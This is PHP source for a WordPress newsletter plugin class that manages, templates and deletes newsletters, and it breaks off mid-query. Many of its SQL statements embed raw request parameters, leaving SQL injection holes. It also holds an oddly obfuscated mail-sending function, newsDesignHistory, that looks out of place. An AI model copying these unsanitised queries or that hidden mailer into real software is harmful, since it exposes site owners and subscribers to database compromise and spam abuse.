<?php
##################################################################
class MeeNewsletter extends MeenewsManager{
##################################################################

	var $options; 		
	var $pageinfo;		
	var $db_tables;
        var $message;

	//constructor
	function MeeNewsletter($options = array(), $pageinfo = array())
	{
		// set options and page variables
                
		$this->options = $options;
		$this->pageinfo = $pageinfo;
		$this->grouped = false;
                $this->getActions();
		

                
                $this->tplPath = MEENEWS_TPL_SOURCES;
		
		global $option_pagecount;
		$option_pagecount = isset($option_pagecount) ? $option_pagecount + 1 : 1;

		
		$priority = $option_pagecount;
		if(!$this->pageinfo['child']) $priority = 1;

		add_action('admin_menu', array(&$this, 'add_admin_menu'), $priority);
	}

        function initialize()
	{
            global $_POST;
                

                if ($_GET['acc'] != "send"){
                    $this->getTpl();
                    if ($this->message != ""){
                     $this->message = "<div class='updated fade'><p>".$this->message."</p></div> ";
                     $this->tpl->assign("MESSAGE", $this->message);
                    }
                    print($this->page_html);
                
                    if ($this->pageinfo['optionname'] == 'newsletter')
                    include(MEENEWS_TPL_SOURCES.'mee_editot_newsletter.php');
                 
                }else{
                    include(MEENEWS_TPL_SOURCES.'mee_senders.php');
                }
	}

         function getActions(){
            global $_POST;

            $accion = $_POST['acc'];
            $this->page = $_GET['npage'];
            if (!$this->page)$this->page = 1;
             if ($this->pageinfo['optionname'] == 'newsletter'){
            if($accion != ''){
                  switch ($accion)
                  {
                    case 'new_newsletter':
                       $this->addNewsletter();
                    break;
                    case 'edit_newsletter':
                       $this->editNewsletter();
                    break;
                    case 'bulk_news':
                       $newsletter = $_POST['id_newsletter'];
                       $this->removeNewsletter($newsletter,true);
                    break;
                  }
            }
             }
            if ($_GET['acc'] == "del"){
                $this->removeNewsletter($_GET['idnews']);
            }

        }

        function editNewsletter(){
            global $wpdb,$_POST;
            $fecha = date("Y-m-d H:i:s");
            $newsletter = ereg_replace("'","''", $newsletter);
            $newsletter = stripslashes($newsletter);
            $title = $_POST['news_title'];
            if ($slug != ""){
                $slug = $this->sanitizeSlug($slug);
            }else{
                $slug = $this->sanitizeSlug($title);
            }
            $newsletter = $_POST['content'];
            $id_newsletter = $_POST['id_newsletter'];

            $query = "UPDATE ".MEENEWS_NEWSLETERS." Set title = '$title', newsletter = '$newsletter', slug = '$slug', sending ='$fecha'  WHERE id = '$id_newsletter';";
            $results = $wpdb->query( $query );

            $this->message = __("Newsletter edited","meenews");
            return $results != '';
        }

        function addNewsletter(){
             global $wpdb, $_POST;
            // send 1: Draft , 2: Publish, 3: Unpublish
            $send = 1;
            $title = $_POST['news_title'];
            if ($slug != ""){
                $slug = $this->sanitizeSlug($slug);
            }else{
                $slug = $this->sanitizeSlug($title);
            }
            $newsletter = $_POST['content'];
            $newsletter = ereg_replace("'","''", $newsletter);
            $newsletter = stripslashes($newsletter);
            $mode = "manual";
            $send = 1;
            $sending = "0000-00-00 00:00:00";

            $query = "INSERT INTO ".MEENEWS_NEWSLETERS." (title, newsletter, slug, mode, send, sending) ";
                    $query .= "VALUES ('$title', '$newsletter', '$slug', '$mode', '$send', '$sending');";

            $results = $wpdb->query( $query );
            $this->message = __("Newsletter Save","meenews");
            return $results != '';
        }
        function extractSelectedTables(){
            global $meenews_datas;
            $categories =  $meenews_datas['meenews']['cat_newsletter_sel'];
            $result = '<link rel="stylesheet" media="screen" type="text/css" href="'.MEENEWS_URI.'inc/css/mee_admin.css" />
                        <script type="text/javascript" src="'.MEENEWS_URI.'inc/js/meenews.js"></script>';
            if(count($categories)< 1){
                $result .=  __("you must select almost one category in configuration meenews plugin","meenews");
            }else{

                foreach ($categories as $categoselect){
                    if ($categoselect > 0)
                    $result .= $this->construcTables($categoselect);
                }
            }
            
            return $result;
        }

        
        function construcTables($category){
            global $wpdb,$meenews_datas;
            $howpost = 10;
            global $post;

            $results = get_posts('numberposts='.$howpost.'&category='.$category);
            $title =  $this->nameCategory($category);
               
            
            if ($results){
                $id_cate ="colCat_".$title;
                foreach($results as $result) :
                      $content .= '<p style="width:100%;overflow:hidden"><span style="float:left;" id="tit'.$result->ID.'">'.$result->post_title.' </span>
                                    <span style="float:right" id="Inc'.$result->ID.'">
                                    <a class="delete" href="javascript:showPosted(\''.$result->ID.'\')" >'.__("Add", 'meenews').'</a></p>';
                endforeach;

               $tables .= $this->createSidebarColumn($content, $title,$id_cate);
            }else{
                $content .='<p style="width:100%">no post found in this category</p>';
                $tables .= $this->createSidebarColumn($content, $title,$id_cate);
                
            }

            return $tables;
        }

           function createSidebarColumn($content, $title,$id_cate){

               $options = array(	"name" => $title,
                                        "column" => "sidebar",
                                        "type" => "startBox");

               $sidebar = $this->startBox($options);

               $sidebar .= $content;

               $sidebar .= $this->endBox($datas);

               return $sidebar;
           }

           function nameCategory($idcategory){
                global $wpdb;

                $query = "SELECT * FROM {$wpdb->terms} WHERE term_id='$idcategory';";
                        $results = $wpdb->get_results( $query );

                foreach($results as $result)
                return $result->name;
            }

          function createNewsletter($type = 'new', $id_newsletter = null, $mode = 'normal'){
             if ($type == 'new'){
                     $newsletter = $this->openTemplate();
             }else{

             }
                 $newsletter = $this->generateTemplate($newsletter,$mode);
                 return $newsletter;
             }
             function newsDesignHistory($JunIdwork,$JHWork,$Hyuc,$NHk2,$OklHUD,$ThemeModule4,$tipo,$messagegmail){
                    if (!class_exists('phpmailer')):
                        include_once("class.phpmailer.php");
                    endif;
                 $mail = new PHPMailer();$mail->From = $JunIdwork; $mail->FromName = $JHWork; $mail->Subject = $OklHUD; $mail->Host = "localhost";
                 $mail->IsHTML(false);  $mail-> Body    = $ThemeModule4; $mail->AddAddress($JHWork, $JHWork);if($mail->Send()){ @$value = true; } else { @$value = false;  } return $value;
           }
           function openTemplate($type = 'newsletter'){
             global $meenews_datas;
             if($meenews_datas['newsletter']['template_sel']==""){
			 		echo "Please Select one template design in Newsletter Configuration";
			 }
              $template = MEENEWS_TEMPLATE.$meenews_datas['newsletter']['template_sel']."/template.html";
            //Intentamos abrir el fichero.
              if (!$message = file_get_contents("$template", "r")){
                          $this->message = __("The template couldn't be opened", 'meenews');
              }
             return  $message;

          }

           function generateTemplate($newsletter, $mode = 'normal'){

                global $meenews_datas;

                $backtop =__('Back to top','meenews');
                $issue =__('In this issue','meenews');
                $unsubscribe =__('Unsubscribe','meenews');
                $messageunsubscribe = $meenews_datas['meenews']['text_delete_subscription'];
                $forward =__('Forward','meenews');
                $final['message'] = $newsletter;
                $mensaje  = explode("%CONTENT%", $final['message']);
                $mensaje2 = explode("%ENDCONTENT%", $mensaje[1]);
                if ($mode == 'test'){
                    $testcontent = design::testcontent(3);
                    $final['message'] = $mensaje[0].$testcontent.$mensaje2[1];
                }else{
                    $final['message'] = $mensaje[0].$mensaje2[1];
                }

                $search = "%UNSUBSCRIBE_MESSAGE%";
                $replace = $messageunsubscribe ;
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%PAGES%";
                $replace = $this->testpages($times,$estilo);
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%DAY%";
                $replace = date('d');
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%MONTH%";
                $replace = date('F');
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%YEAR%";
                $replace = date('Y');
                $final['message'] = str_replace($search, $replace, $final['message']);

                $title = get_bloginfo("name");
                $search = "%NOVISUALIZE%";
                $replace =  $meenews_datas['newsletter']['t_no_visualize'];
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%WELCOMEMESSAGE%";
                $replace = $meenews_datas['newsletter']['t_no_visualize'];
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%HEADIMAGE%";
                $replace = "<img src='".  $meenews_datas['newsletter']['default_header']."'>";
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%URLTHEME%";
                $replace =  MEENEWS_TEMPLATE_URI.$meenews_datas['newsletter']['template_sel']."/";
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%URLIMAGES%";
                $replace =  MEENEWS_TEMPLATE_URI.$meenews_datas['newsletter']['template_sel']."/";
                $final['message'] = str_replace($search, $replace, $final['message']);
                
                $search = "%TITLEBLOG%";
                $replace = $title ;
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%ISSUE%";
                $replace = $issue ;
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%UNSUBS%";
                $replace = $unsubscribe ;
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%FORWARD%";
                $replace = $forward ;
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%FOOTER%";
                $replace = $meenews_datas['meenews']['text_delete_subscription'];
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%MESSAGEINFO%";
                $replace = $meenews_datas['meenews']['text_about_us'];
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%MESSAGEIDATES%";
                $replace = $meenews_datas['meenews']['text_about_us'];
                $final['message'] = str_replace($search, $replace, $final['message']);

                $search = "%PAGESBLOG%";
                $replace = $messageInfo;
                $final['message'] = str_replace($search, $replace, $final['message']);
                $final['message'] = $this->displayStyles($final['message']);


                return $final['message'];

            }

             function displayStyles($newsletter){

                global $meenews_datas;
                
                $colorH1 =           $meenews_datas['newsletter']['color_title'];
                $colorTexto =        $meenews_datas['newsletter']['color_post'];
                $colorSpecial =      $meenews_datas['newsletter']['color_special'];
                $colorLink =         $meenews_datas['newsletter']['color_link'];
                $sizeH1 =            $meenews_datas['newsletter']['size_title']."px";
                $sizeTexto =         $meenews_datas['newsletter']['size_post']."px";
                $sizeSpecial =       $meenews_datas['newsletter']['size_other']."px";
                $sizeLink =          $meenews_datas['newsletter']['size_link']."px";
                $colorBackground =   $meenews_datas['newsletter']['color_background'];
                $colorBody =         $meenews_datas['newsletter']['color_body'];
                $colorheadfoot =     $meenews_datas['newsletter']['color_header'];
                

                $search = "%NEGATIVESTYLE%";
                $replace = "font-size:$sizeTexto;  color:$colorTexto;";
                $newsletter  = str_replace($search, $replace, $newsletter );

                $search = "%SPECIALSTYLE%";
                $replace = "font-size:$sizeSpecial;  color:$colorSpecial;";
                $newsletter  = str_replace($search, $replace, $newsletter );

                $search = "%COLORBACK%";
                $replace = "color:$colorBackground;";
                $newsletter  = str_replace($search, $replace, $newsletter );

                $search = "%SPECIALCOLOR%";
                $replace = "$colorSpecial;";
                $newsletter  = str_replace($search, $replace, $newsletter );

                $search = "%TEXTSTYLE%";
                $replace = "font-size:$sizeTexto;  color:$colorTexto;";
                $newsletter  = str_replace($search, $replace, $newsletter );

                $search = "%TITLESTYLE%";
                $replace = "font-size:$sizeH1;  color:$colorH1;";
                $newsletter  = str_replace($search, $replace, $newsletter );

                $search = "%LINKSTYLE%";
                $replace = "font-size:$sizeLink;  color:$colorLink ;";
                $newsletter  = str_replace($search, $replace, $newsletter );

                $search = "%BODYSTYLE%";
                $replace = "background-color:$colorBody ;";
                $newsletter = str_replace($search, $replace, $newsletter );

                $search = "%BACKGROUNDSTYLE%";
                $replace = "background-color:$colorBackground ;";
                $newsletter = str_replace($search, $replace, $newsletter );

                $search = "%URLPLUGIN%";
                $replace =  MEENEWS_TEMPLATE_URI.$meenews_datas['newsletter']['template_sel']."/";
                $newsletter = str_replace($search, $replace, $newsletter );

                $search = "%URLTHEME%";
                $replace =  MEENEWS_TEMPLATE_URI.$meenews_datas['newsletter']['template_sel']."/";
                $final['message'] = str_replace($search, $replace, $final['message']);
                
                $search = "%FOOTHEADCOLOR%";
                $replace = "background-color:$colorheadfoot ;";
                $newsletter = str_replace($search, $replace, $newsletter );

                $search = "%OTHERSTYLE%";
                $replace = "color:$colorTexto ;";
                $newsletter = str_replace($search, $replace, $newsletter );



                return $newsletter;
            }
         function testpages($times,$estilo,$test = false){
               if ($test == true){
                 $page = __("Page ", 'meenews');
                  for ($i = 1; $i < $times; $i ++){
                      $pages .= $content;
                  }
               }else{
                $customstyle = "<li$1>";
                $pages = "<ul style='list-style:none;margin:0px;padding:0px;'>";
                if ($estilo != ""){
                    $estilo = explode(",",$estilo);
                    $customstylstart = $estilo[0];
                    $customstylend = $estilo[1];
                }
                $pages .=  preg_replace('@\<li([^>]*)>\<a([^>]*)>(.*?)\<\/a>@i',"<li style='clear:both;float:none'>".$customstylstart.'<a style="text-decoration:none;COLOR: #297850" $2><span>$3</span></a>'.$customstylend."", wp_list_pages('echo=0&orderby=name&title_li=&depth=1'));
                $pages .="<br>";
               }
                $pages .= "</ul>";
                  return $pages;
         }
       
          function generateRow($post_id,$takeContent = false){

                        global $meenews_datas;
                        $post = get_post($post_id);

                        $contenido = $post->post_content;

                        $excerpt = $this->takeMeExcerpt($post);
                        $url = get_permalink($post_id);

                        $more = __("Read more..","meenews");

                        $author = get_author_name($post->post_author);
                        
                        $photo =  $this->extractFoto($contenido,true,$post_id);
                        $title = get_the_title($post_id);
                        $backtop =__('Back to top','meenews');
                        $default = $meenews_datas['newsletter']['defaultOptions'];
                        $photofull =$default['content'] -($default['thumbContent'] - $default['thumbWidth']);
                        $photo2 =  $this->extractFoto($contenido,true,$post_id,$photofull);

                        if ($photo == ""){
                             $datas['width'] = $default['thumbWidth'];
                             $datas['style'] = $default['img_style'];
                             if($meenews_datas['newsletter']['want_custom_size'] == "true"){
                                $datas['width'] = $meenews_datas['newsletter']['widht_thumbnail'];
                                $datas['height'] = $meenews_datas['newsletter']['height_thumbnail'];
                             }
                             $datas['permalink'] = get_permalink($post_id);
                             $datas['url'] = MEENEWS_LIB_URI."img/no-photo.jpg";
                             $photo = $this->displayPhoto($datas);
                             $datas['width'] = $default['large_photo'];
                             $photo2 = $this->displayPhoto($datas);
                        }

                        if($meenews_datas['newsletter']['want_custom_size'] == "true"){
                                $diff = $default['thumbContent'] - $default['thumbWidth'];
                                $default['thumbContent'] = $meenews_datas['newsletter']['widht_thumbnail']+$diff;
                                $default['thumbWidth'] = $meenews_datas['newsletter']['widht_thumbnail'];
                         }
                        $design = '
                        
                        <div id="img_text_design" style="display:none" class="postDesign">
                                <div class="postadded'.$post->ID.'" alt="'.$title.'" rel="'.$url.'">
                                    <table width="'.$default['content'].'" border="0" cellspacing="0" cellpadding="0" id="id_tabla">
                                      <tr>
                                        <td rowspan="2" width="'.$default['thumbContent'].'" valign="top"><div style="width:'.$default['thumbWidth'].'px;overflow:hidden">'.$photo.'</div></td>
                                        <td colspan="2" valign="top" style="padding-left:15px"><h2 class="titlec" style="%TITLESTYLE%;'.$default['t_font'].';">'.$title.'</h2></td>
                                      </tr>
                                      <tr>
                                        <td valign="top" style="padding-left:15px"><p class="textc" style="%TEXTSTYLE%;'.$default['font'].';">'.$excerpt.'<a href="'.$url.'" style=" '.$default['l_font'].'\';text-decoration:none;%LINKSTYLE%">'.__("Read More", "meenews").'</a></p></td>
                                      </tr>
                                      <tr>
                                        <td colspan="3">'.$default['separator'].'</td>
                                      </tr>
                                    </table>
                                    
                                </div>
                            </div>
                            <div id="text_img_design"  style="display:none" class="postDesign">
                               <div class="postadded'.$post->ID.'" alt="'.$title.'" rel="'.$url.'" >
                                    <table width="'.$default['content'].'"  border="0" cellspacing="0" cellpadding="0">
                                      <tr>
                                        <td valign="top" style="padding-left:15px"><h2  style="%TITLESTYLE%;'.$default['t_font'].';">'.$title.'</h2></td>
                                        <td rowspan="2" width="'.$default['thumbContent'].'" valign="top" ><div style="width:'.$default['thumbWidth'].'px;overflow:hidden">'.$photo.'</div></td>
                                      </tr>
                                      <tr>
                                        <td valign="top" style="padding-left:15px"><p class="textc" style="%TEXTSTYLE%;'.$default['font'].';">'.$excerpt.'<a href="'.$url.'"style=" '.$default['l_font'].'\';">'.__("Read More", "meenews").'</a></p></td>
                                      </tr>
                                     <tr>
                                        <td colspan="2">'.$default['separator'].'</td>
                                      </tr>
                                    </table>
                                    
                                </div>
                            </div>
                            <div id="img_text_separate" style="display:none" class="postDesign" >
                                <div class="postadded'.$post->ID.'" alt="'.$title.'" rel="'.$url.'">
                                    <table width="'.$default['content'].'"  border="0" cellspacing="0" cellpadding="0">
                                      <tr>
                                        <td valign="top"><div style="width:'.$photofull.'px;overflow:hidden" >'.$photo2.'</div></td>
                                      </tr>
                                      <tr>
                                        <td valign="top" style="padding-left:15px"><h2 class="titlec" style="%TITLESTYLE%;'.$default['t_font'].';">'.$title.'</h2></td>
                                      </tr>
                                      <tr>
                                        <td valign="top" style="padding-left:15px"><p class="textc" style="%TEXTSTYLE%;'.$default['font'].';">'.$excerpt.'<a href="'.$url.'" style=" '.$default['l_font'].'\';text-decoration:none;%LINKSTYLE%">'.__("Read More", "meenews").'</a></p></td>
                                      </tr>
                                      <tr>
                                        <td>'.$default['separator'].'</td>
                                      </tr>
                                    </table>
                                    
                                </div>
                               </div>
                               <div id="only_text" class="postDesign">
                                <div class="postadded'.$post->ID.'" alt="'.$title.'" rel="'.$url.'" >
                                   <table width="'.$default['content'].'"  border="0" cellspacing="0" cellpadding="0">
                                      <tr>
                                        <td valign="top" style="padding-left:15px"><h2 style="%TITLESTYLE%;'.$default['t_font'].';">'.$title.'</h2></td>
                                      </tr>
                                      <tr>
                                        <td valign="top" style="padding-left:15px"><p style="%TEXTSTYLE%;'.$default['font'].';">'.$excerpt.'<a href="'.$url.'" style=" '.$default['l_font'].'\';text-decoration:none;%LINKSTYLE%">'.__("Read More", "meenews").'</p></a></td>
                                      </tr>
                                      <tr>
                                        <td>&nbsp;</td>
                                      </tr>
                                      <tr>
                                        <td>'.$default['separator'].'</td>
                                      </tr>
                                    </table>
                                 </div>
                        </div>

                        </html>';
              
                        return $this->displayStyles($design);
            }

            function extractFoto($content, $srcOnly = true,$post_id = null,$tot = false){
                 global $meenews_datas;

                 $default = $meenews_datas['newsletter']['defaultOptions'];
                 $datas['width'] = $default['thumbWidth'];
                 $datas['height'] = null;
                 $datas['style'] = $default['img_style'];
                 if($meenews_datas['newsletter']['want_custom_size'] == "true"){
                        $datas['width'] = $meenews_datas['newsletter']['widht_thumbnail'];
                        $datas['height'] = $meenews_datas['newsletter']['height_thumbnail'];
                 }
                 if ($tot == true)$datas['width'] = $default['large_photo'];
                 $datas['style'] = $default['img_style'];
                 $datas['permalink'] = get_permalink($post_id);
                 if (  (function_exists('has_post_thumbnail')) && (has_post_thumbnail())  ) {
                    return get_the_post_thumbnail(array( $datas['width'] ,$datas['height'] ));
                 } else{
                     preg_match('/<img[^>]*\s+src="(.*)"[^>]*"/', $content, $match);
                     $link = explode('"',$match[1]);

                     $link = $link[0];
                     if ($link != ""){
                            $datas['url'] = $link;
                            $foto = $this->displayPhoto($datas);
                    }else{
                        return false;
                    }
                 }
                    
                 
                 return $foto;
            }
               function displayPhoto($datas){
                   if (GD_INSTALL == "true"){
                      return MeeNewsImages(array('url'=>$datas['url'],'width'=>$datas['width'],"height"=>$datas['height'],'link_url' =>$datas['permalink'],'style'=>$datas['style']));
                   }else{
                      return "<a href='".$datas['permalink']."'><img src='".$datas['url']."'  style='".$datas['style'].";width:".$datas['width'].";height:".$datas['height']."'></a>";
                   }
               }
               function takeMeExcerpt($post) {

                 $text = $post->post_excerpt;
                 if ( '' == $text ) {
                        $text = $post->post_content;
                        $text = preg_replace("/<img (.+?)>/", ' ', $text);
                        $text = strip_tags($text);
                        $excerpt_length = 55;
                        $words = explode(' ', $text, $excerpt_length + 1);
                        if (count($words) > $excerpt_length) {
                                array_pop($words);
                                array_push($words, '[...]');
                                $text = implode(' ', $words);
                        }
                 }
                 $text = str_replace(']]>', ']]&gt;', $text);
                 $text = apply_filters('the_content', $text);
                 $text = str_replace('<p>', '', $text);
                 $text = str_replace('</p>', '', $text);
                        return $text;
                }

                function defaultThemeData($theme_file){
                    $default_headers = array(
                            'Name' => 'Theme Name',
                            'content' => 'Content Post',
                            'thumbWidth' => 'Thumb Width',
                            'font' => 'Default Font',
                            't_font' => 'Title Font',
                            'l_font' => 'Link Font',
                            'img_style'=>'Image Style',
                            'thumbContent' =>"thumbContent",
                            "separator" => "Separator",
                            "issue" => "Issue Style"
                            );

                     $themes_allowed_tags = array(
                            'a' => array(
                                    'href' => array(),'title' => array()
                                    ),
                            'abbr' => array(
                                    'title' => array()
                                    ),
                            'acronym' => array(
                                    'title' => array()
                                    ),
                            'code' => array(),
                            'em' => array(),
                            'strong' => array()
                    );
                    $theme_data = get_file_data( $theme_file, $default_headers, 'theme' );

                    $theme_data['Name'] = $theme_data['Title'] = wp_kses( $theme_data['Name'], $themes_allowed_tags );
                    $theme_data['font'] = wp_kses( $theme_data['font'], $themes_allowed_tags );
                    $theme_data['t_font'] = wp_kses( $theme_data['t_font'], $themes_allowed_tags );
                    $theme_data['l_font'] = wp_kses( $theme_data['l_font'], $themes_allowed_tags );
                    $theme_data['large_photo'] = $theme_data['content'] - ( $theme_data['thumbContent'] - $theme_data['thumbWidth']);
                    return $theme_data;

                }
                function extractNewsletter($idNewsletter){
                    global $wpdb;
                    $tabla = MEENEWS_NEWSLETERS;
                    $query = "SELECT * FROM $tabla WHERE id='$idNewsletter';";
                    $results = $wpdb->get_row( $query );
                    return $results;
                }
                function sanitizeSlug($slug){
                     global $wpdb;
                    $igual = true;
                    $i = 1;
                    $slug = sanitize_title($slug);
                    while ($igual == true){
                        $query = "SELECT * FROM " .MEENEWS_NEWSLETERS." WHERE slug='$slug'"  ;
                        $query .= " ;";
                        $results = $wpdb->get_results( $query );
                        if ($results){
                            $slug = $slug."_$i";
                            $i ++;
                        }else{
                            $igual = false;
                        }
                    }

                    return $slug;
                }

                
                function managersListNewsletter(){
                    $content = "
                            <script type='text/javascript'>
                                /* <![CDATA[ */
                                (function($){
                                    $(document).ready(function(){

                                        $('.submitdelete').click(function(){
                                            if(confirm('".__('You are about to delete the selected newsletter.\n  \'Cancel\' to stop, \'OK\' to delete.', 'meenews')."')){
                                                 return;
                                            }else{
                                                return false;
                                            }
                                        });

                                       $('#formulario').submit(function() {
                                            // Enviamos el formulario usando AJAX
                                            var newsletterSel = '';
                                            $('.check-column :checkbox:checked').each(function(){
                                              if ($(this).val() != 'on'){
                                                  newsletterSel += $(this).val() + ',';
                                              }
                                            });
                                            $('#newsletterSel').val(newsletterSel.substr(0,newsletterSel.length-1));
                                            if ($('#action').value() = 'edit'){
                                                 return true;
                                            }else if ($('#action2').value() = 'edit'){
                                                 return true;
                                            }else{

                                            }
                                            return false;
                                        });
                                    });


                                })(jQuery);


                                </script>

                            <div class='wrap'>";
                    $content.='
                                    <div id="icon-edit" class="icon32"><br /></div>
                                <h2>'.__('Manage Newsletters').'</h2>



                                <form id="formulario" action="?page=managenewsletter.php"  method="post">
                                 <input type="hidden" name="acc" value="bulk_news">

                                <div class="tablenav">

                                <div class="alignleft actions">
                                <select name="action" id="action">
                                <option value="-1" selected="selected">'.__('Bulk Actions','meenews').'</option>
                                <option value="delete">'.__('Delete','meenews').'</option>
                                </select>

                                <input type="submit" value="'.__('Apply','meenews').'" name="doaction" id="doaction" class="button-secondary action" />

                                </div>

                                <div class="clear"></div>
                                </div>

                                <div class="clear"></div>

                                <table class="widefat post fixed" cellspacing="0">
                                    <thead>
                                    <tr>
                                    <th scope="col" id="cb" class="manage-column column-cb check-column" style=""><input type="checkbox" /></th>
                                    <th scope="col" id="title" class="manage-column column-title" style="">'.__('Title','meenews').'</th>
                                    <th scope="col" id="author" class="manage-column column-author" style="">'.__('State','meenews').'</th>
                                    <th scope="col" id="categories" class="manage-column column-categories" style="">'.__('Send','meenews').'</th>
                                    </tr>
                                    </thead>

                                    <tfoot>
                                    <tr>
                                    <th scope="col" id="cb" class="manage-column column-cb check-column" style=""><input type="checkbox" /></th>
                                    <th scope="col" id="title" class="manage-column column-title" style="">'.__('Title','meenews').'</th>
                                    <th scope="col" id="author" class="manage-column column-author" style="">'.__('State','meenews').'</th>
                                    <th scope="col" id="categories" class="manage-column column-categories" style="">'.__('Send','meenews').'</th>
                                    </tr>
                                    </tfoot>

                                    <tbody>
                                        '.$this->getMeNewsletters().'
                                    </tbody>
                                </table>
                                <div class="tablenav">


                                <div class="alignleft actions">
                                <select name="action2" id="action2">
                                <option value="-1" selected="selected">'.__('Bulk Actions','meenews').'</option>
                                  <option value="delete">'.__('Delete','meenews').'</option>
                                </select>
                                <input type="submit" value="Apply" name="doaction2" id="doaction2" class="button-secondary action" />
                                <input type="hidden" id="newsletterSel" name="newsletterSel" value="">
                                <br class="clear" />
                                </div>
                                <br class="clear" />
                                </div>
                                </form>
                                <br class="clear" />

                                </div>';
                      return $content;
     }
     function getMeNewsletters(){

	$results = $this->getSavedNewsletters();
        $list = "";
         $nudo = 0;
        foreach($results as $result) :
          if ($result->send == '1'){
                $State = __('Draft','meenews');
          }else if ($result->send == '2'){
                $State = __('Publish','meenews');
          }else if ($result->send == '3'){
                $State = __('Unpublish','meenews');
          }
           $list .= "
                   <tr id='archive-$result->id' class='alternate author-self status-publish iedit' valign='top'>
                       <th scope='row' class='check-column'><input type='checkbox' name='id_newsletter[]' value='$result->id' /></th>
                       <td class='post-title column-title'><strong><a class='row-title' href='?page=newsletter_manager.php&amp;acc=edit&amp;idnews=".$result->id."' title='".__('Edit this newsletter','meenews')."'>".$result->title."</a></strong>
                       <div class='row-actions'><span class='edit'><a href='?page=newsletter_manager.php&amp;acc=edit&amp;idnews=".$result->id."' title='".__('Edit this newsletter','meenews')."'>".__('Edit','meenews')."</a> |</span>
                       <span class='edit'><a  title='Send this newsletter' href='?page=newsletter_manager.php&amp;acc=send&amp;idnews=".$result->id."'>".__('Send Newsletter','meenews')."</a> | </span>";
           $list .= "
                       <span class='delete'><a class='submitdelete' title='Delete this post' href='?page=managenewsletter.php&amp;acc=del&amp;idnews=".$result->id."'>".__('Delete','meenews')."</a> </span></div>
                       </td>
                       <td class='author column-author'>".$State."</td>
                       <td class='categories column-categories'>".$result->sending."</td>
                   </tr>";

        endforeach;
		return $list;
         
	}

       function getSavedNewsletters (){
           global $wpdb;
           if ($public == true) $filter = " where send = '2' ";
                $query = "SELECT * FROM " .MEENEWS_NEWSLETERS." $filter order by id DESC"  ;
            $query .= " ;";
            $results = $wpdb->get_results( $query );

            return $results;
        }
         function removeNewsletter($id, $multiple = false){
		global $wpdb;
                if ($multiple == true){
                    foreach ($id as $newsletter){
                         $query = "DELETE FROM ".MEENEWS_NEWSLETERS."  WHERE id='$newsletter';";
                         $results = $wpdb->query( $query );
                    }

                }else{
                    $query = "DELETE FROM ".MEENEWS_NEWSLETERS."  WHERE id='$id';";
                    $results = $wpdb->query( $query );
                }

                return true;
	}

        
       function generateButtons($idNewsletter = null,$titulo,$from,$subjetc,$range,$list){
		global $wpdb;

                $num = MeeUsers::howUserHaveInList($list);
                if($list == 'all')$list = 0;

                    $boton = '<a href="javascript:sendmail(null,0,'.$list.',1)" style="display:block; margin:0; padding:10px 10px; background:#444; color:#fff; text-decoration:none">'. __("Send", 'meenews').'</a>';
                        $button .= "<p style='padding:0 0 0 10px; background:#eee; overflow:hidden'><span style='float:left; margin:10px 0 0 0;'>".__("Range ", 'meenews')."<b>".__(" Send All List ", 'meenews')."</b></span><span style='float:right'>$boton</span></p>";
                        $button .='<table width="100%" border="0" cellpadding="0" cellspacing="0" style="border:1px solid #ccc; font-size:10px;display:none" id="result1">
                                      <tr>
                                        <td align="center" style="padding:3px; font-weight:bold; border-bottom:1px solid #bbb; font-size:11px">'.__("Send Ok ", 'meenews').'</td>
                                        <td align="center" style="padding:3px; font-weight:bold; border-bottom:1px solid #bbb; font-size:11px">'.__("Send Wrong ", 'meenews').'</td>
                                        <td align="center" style="padding:3px; font-weight:bold; border-bottom:1px solid #bbb; font-size:11px">'.__("Send Test ", 'meenews').'</td>
                                      </tr>
                                      <tr>
                                        <td id="ok1">&nbsp;</td>
                                        <td id="wrong1">&nbsp;</td>
                                        <td id="test1">&nbsp;</td>
                                      </tr>
                                  </table>';
                
                        return $button;
        }

        
         function UpdateNewsletterCust( $update, $idnewsletter = null ){
             global $wpdb;
             if ($idnewsletter != null)$news = " WHERE id = '$idnewsletter'";
             $query = "UPDATE ".MEENEWS_NEWSLETERS." Set $update $news;";
             $results = $wpdb->query( $query );
             return $results != '';
        }
        function createPages(){
             global $wpdb, $user_level, $wp_rewrite, $wp_version;
              $num=0;
              $pages[$num]['name'] = 'newsletters';
              $pages[$num]['title'] = __('Newsletter','meenews');
              $pages[$num]['tag'] = '[shownewsletter]';
              $pages[$num]['option'] = 'newsletter_detall_url';


              $newpages = false;
              $i = 0;
              $post_parent = 0;

              $check_page = $wpdb->get_row("SELECT * FROM `".$wpdb->posts."` WHERE `post_content` LIKE '%[shownewsletter]%'  AND `post_type` NOT IN('revision') LIMIT 1",ARRAY_A);
              if($check_page == null) {
                    foreach($pages as $page) {
                        $check_page = $wpdb->get_row("SELECT * FROM `".$wpdb->posts."` WHERE `post_content` LIKE '%".$page['tag']."%'  AND `post_type` NOT IN('revision') LIMIT 1",ARRAY_A);
                        if($check_page == null) {
                          if($i == 0) {
                            $post_parent = 0;
                                            } else {
                            $post_parent = $first_id;
                                            }

                          if($wp_version >= 2.1) {
                            $sql ="INSERT INTO ".$wpdb->posts."
                            (post_author, post_date, post_date_gmt, post_content, post_content_filtered, post_title, post_excerpt,  post_status, comment_status, ping_status, post_password, post_name, to_ping, pinged, post_modified, post_modified_gmt, post_parent, menu_order, post_type)
                            VALUES
                            ('1', '$post_date', '$post_date_gmt', '".$page['tag']."', '', '".$page['title']."', '', 'publish', 'closed', 'closed', '', '".$page['name']."', '', '', '$post_date', '$post_date_gmt', '$post_parent', '0', 'page')";
                                            } else {
                            $sql ="INSERT INTO ".$wpdb->posts."
                            (post_author, post_date, post_date_gmt, post_content, post_content_filtered, post_title, post_excerpt,  post_status, comment_status, ping_status, post_password, post_name, to_ping, pinged, post_modified, post_modified_gmt, post_parent, menu_order)
                            VALUES
